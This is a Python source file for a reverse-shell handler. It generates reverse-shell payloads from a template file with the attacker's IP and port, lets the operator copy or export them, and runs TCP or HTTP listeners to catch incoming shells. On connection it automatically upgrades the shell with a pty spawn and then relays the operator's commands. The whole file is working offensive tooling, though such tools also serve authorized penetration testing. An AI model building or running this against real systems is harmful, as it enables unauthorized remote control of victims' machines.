#!/usr/bin/env python3
import os
import socket
import subprocess
import threading
import readline
import json
from datetime import datetime
from listeners import TCPListener
from web_listener import WebListener
from utils import is_binary_available, copy_to_clipboard, export_payload
import re
import time

# ============================
# Memory save file location
# ============================
SAVE_FILE = "session_memory.json"
JSON_PAYLOAD_FILE = "revshell_payloads.json"  # <-- Load payloads from here

def save_session(data):
    with open(SAVE_FILE, 'w') as f:
        json.dump(data, f)

def load_session():
    if os.path.exists(SAVE_FILE):
        with open(SAVE_FILE, 'r') as f:
            return json.load(f)
    return {}

# ============================
# Load Payloads from JSON
# ============================
def load_payloads():
    if os.path.exists(JSON_PAYLOAD_FILE):
        with open(JSON_PAYLOAD_FILE, 'r') as f:
            data = json.load(f)
            return data
    else:
        print(f"[!] Payload file '{JSON_PAYLOAD_FILE}' not found. Please generate it from data.js.")
        return []

# ============================
# Filter Payloads by OS
# ============================
def filter_payloads(payloads, os_filter=None, search=None):
    filtered = payloads
    if os_filter:
        filtered = [p for p in filtered if os_filter in p.get('meta', [])]
    if search:
        filtered = [p for p in filtered if search.lower() in p['name'].lower()]
    return filtered

# ============================
# Add Custom Payload
# ============================
def add_custom_payload(payloads):
    name = input("Enter custom payload name: ")
    command = input("Enter custom payload command (use {ip}, {port}, {shell}): ")
    meta = input("Enter meta tags (comma separated, e.g. linux,mac): ").split(',')
    payloads.append({"name": name, "command": command, "meta": [m.strip() for m in meta]})
    print(f"[+] Custom payload '{name}' added.")
    return payloads

# ============================
# Detect Local IP
# ============================
def get_all_local_ips():
    ips = set()
    try:
        for iface in os.listdir('/sys/class/net/'):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ip = socket.gethostbyname(socket.getfqdn())
                if ip and not ip.startswith('127.'):
                    ips.add(ip)
            except:
                pass
        # Fallback: parse 'ip addr' output
        output = subprocess.check_output("ip -4 addr", shell=True).decode()
        found = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)', output)
        for ip in found:
            if not ip.startswith('127.'):
                ips.add(ip)
    except Exception as e:
        pass
    return list(ips)

# ============================
# Auto Shell Upgrade
# ============================
def auto_upgrade_shell(conn):
    try:
        conn.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
        conn.send(b"export TERM=xterm\n")
        conn.send(b"stty raw -echo\n")
    except:
        pass

# ============================
# Listener
# ============================
def start_listener(ip, port):
    print(f"[*] Starting listener on {ip}:{port}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))
        s.listen(1)
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        auto_upgrade_shell(conn)

        def recv():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    print(data.decode(errors='ignore'), end='')
                except:
                    break

        threading.Thread(target=recv, daemon=True).start()

        while True:
            try:
                cmd = input()
                conn.send((cmd + "\n").encode())
            except KeyboardInterrupt:
                print("\n[*] Listener terminated.")
                break

# ============================
# Main Script
# ============================
def main():
    ips = get_all_local_ips()
    print("[*] Detected local IP addresses:")
    for idx, ip in enumerate(ips):
        print(f"[{idx}] {ip}")
    if ips:
        ip_choice = input(f"Select LHOST by number [0]: ") or "0"
        try:
            local_ip = ips[int(ip_choice)]
        except:
            local_ip = ips[0]
    else:
        local_ip = "127.0.0.1"
    print(f"[*] Using LHOST: {local_ip}")

    payloads = load_payloads()
    if not payloads:
        exit(1)

    # Payload testing
    print("\n[Payload Test] Check if a binary is available on your system.")
    test_bin = input("Enter binary to test (e.g. nc, python, bash, leave blank to skip): ").strip()
    if test_bin:
        if is_binary_available(test_bin):
            print(f"[+] {test_bin} is available!")
        else:
            print(f"[!] {test_bin} is NOT available.")

    # Payload selection
    print("\nSelect payload:")
    for i, p in enumerate(payloads):
        print(f"[{i}] {p['name']} ({', '.join(p.get('meta', []))})")
    choice = input("Choice: ")
    try:
        choice = int(choice)
        payload = payloads[choice]
    except:
        payload = payloads[0]

    lhost = input(f"Enter LHOST [{local_ip}]: ") or local_ip
    lport = input(f"Enter LPORT [4444]: ") or "4444"
    shell = input("Shell to use (default: /bin/bash): ") or "/bin/bash"
    payload_str = payload['command'].format(ip=lhost, port=lport, shell=shell)
    print(f"\n[+] Generated Payload:\n{payload_str}\n")

    # Payload sharing
    if input("Copy payload to clipboard? (y/n): ").lower() == 'y':
        copy_to_clipboard(payload_str)
    if input("Export payload to file? (y/n): ").lower() == 'y':
        fname = f"payload_{payload['name'].replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        export_payload(payload_str, fname)

    # Listener selection
    print("\nListener options:")
    print("[1] TCP Listener (single or multi)")
    print("[2] Web Listener (HTTP)")
    listener_type = input("Select listener type [1/2]: ")

    if listener_type == '2':
        web_port = int(input("Web listener port [8080]: ") or "8080")
        web_listener = WebListener(port=web_port)
        web_listener.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping web listener...")
            web_listener.stop()
    else:
        multi = input("Multi-listener mode? (y/n): ").lower() == 'y'
        auto_reconnect = input("Auto-reconnect on drop? (y/n): ").lower() == 'y'
        listeners = []
        if multi:
            pairs = input("Enter IP:PORT pairs separated by comma (e.g. 0.0.0.0:4444,0.0.0.0:5555): ")
            for pair in pairs.split(','):
                ip, port = pair.strip().split(':')
                listener = TCPListener(ip, int(port), auto_reconnect=auto_reconnect)
                listeners.append(listener)
                listener.start()
        else:
            listener = TCPListener(lhost, int(lport), auto_reconnect=auto_reconnect)
            listeners.append(listener)
            listener.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping all listeners...")
            for l in listeners:
                l.stop()

if __name__ == "__main__":
    main()
                                         